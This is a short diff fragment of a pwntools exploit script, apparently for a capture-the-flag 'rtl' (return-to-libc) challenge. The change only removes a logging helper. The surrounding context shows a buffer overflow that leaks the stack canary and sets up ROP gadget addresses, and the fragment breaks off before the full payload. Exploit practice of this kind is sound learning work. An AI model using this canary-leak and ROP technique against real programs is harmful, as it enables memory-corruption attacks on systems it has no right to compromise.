@@ -3,14 +3,10 @@ from pwn import *
 p = process('./rtl')
 e = ELF('./rtl')
 
-def slog(name, addr): return success(': '.join([name, hex(addr)]))
-
 buf = b'a'*0x39
 p.sendafter(b"Buf: ", buf)
 p.recvuntil(buf)
 cnry = u64(b'\x00' + p.recv(7))
-
-slog('cnry', cnry)
 
 ret = 0x400285
 pop_rdi_ret = 0x400853
